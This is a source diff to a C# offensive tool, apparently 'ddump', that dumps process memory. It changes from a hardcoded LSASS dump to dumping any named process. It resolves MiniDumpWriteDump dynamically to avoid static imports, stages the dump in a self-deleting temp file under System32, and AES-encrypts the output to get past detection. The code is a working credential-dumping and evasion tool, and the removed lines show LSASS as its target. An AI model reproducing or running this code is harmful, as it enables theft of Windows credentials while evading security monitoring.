@@ -4,6 +4,8 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using Microsoft.Win32.SafeHandles;
 using static Charles.STRUCTS;
+using System.Security.Cryptography;
+using System.Text;
 
 namespace Charles
 {
@@ -663,13 +665,72 @@ namespace Charles
     {
         public static void Main(string[] args)
         {
-            FileStream fs = new FileStream("C:\\Temp\\rofl.bin", FileMode.CreateNew); //change this
-            var lsass = Process.GetProcessesByName("lsass")[0];
-   
-            IntPtr pointer = Invoke.GetLibraryAddress("dbgcore.dll", "MiniDumpWriteDump");
-            DELEGATES.MiniDumpWriteDump MDWD = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.MiniDumpWriteDump)) as DELEGATES.MiniDumpWriteDump;
 
-            MDWD(lsass.Handle, lsass.Id, fs.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);              
+            if (args.Length != 4)
+            {
+                Console.WriteLine("Usage: ddump.exe [process] [key] [iv] [destination]");
+                Console.WriteLine("Example: ddump.exe notepad 'AH!PSB5%FRHZ$UKA' 'HV$3pIjHR$3pDj1' C:\\temp\\poney.bin");
+                return;
+            }
+
+
+            //Setup AES key and IV
+            string key = args[1];
+            string iv = args[2];
+
+            //Which process to dump    
+            Process process = Process.GetProcessesByName(args[0])[0];
+
+            //Generate a minidump
+            byte[] dumpBytes = Dump(process);
+
+            //Encrypt the dump
+            byte[] encryptedDump = EncryptBytes(dumpBytes, key , iv);
+
+            // Write the encrypted data to a file
+            File.WriteAllBytes(args[3], encryptedDump);
+
+            static byte[] Dump(Process process)
+            {
+                using (MemoryStream memoryStream = new MemoryStream())
+                {
+                    using (FileStream fs = new FileStream("C:\\Windows\\System32\\somedll.dll", FileMode.CreateNew, FileAccess.ReadWrite, FileShare.None, 4096, FileOptions.DeleteOnClose))
+                    {
+                        
+                        
+
+                        IntPtr pointer = Invoke.GetLibraryAddress("dbgcore.dll", "MiniDumpWriteDump");
+                        DELEGATES.MiniDumpWriteDump MDWD = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.MiniDumpWriteDump)) as DELEGATES.MiniDumpWriteDump;
+
+
+                        MDWD(process.Handle, process.Id, fs.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+
+                        fs.CopyTo(memoryStream);
+                    }
+
+                    return memoryStream.ToArray();
+
+                }
+            }
+
+            static byte[] EncryptBytes(byte[] inputBytes, string key, string iv)
+            {
+                using (Aes aesAlg = Aes.Create())
+                {
+                    aesAlg.Key = ASCIIEncoding.ASCII.GetBytes(key);
+                    aesAlg.IV = ASCIIEncoding.ASCII.GetBytes(iv);
+
+                    using (MemoryStream msEncrypt = new MemoryStream())
+                    using (ICryptoTransform encryptor = aesAlg.CreateEncryptor())
+                    using (CryptoStream cryptoStream = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+                    {
+                        cryptoStream.Write(inputBytes, 0, inputBytes.Length);
+                        cryptoStream.FlushFinalBlock();
+
+                        return msEncrypt.ToArray();
+                    }
+                }
+            }
         }
     }
 }
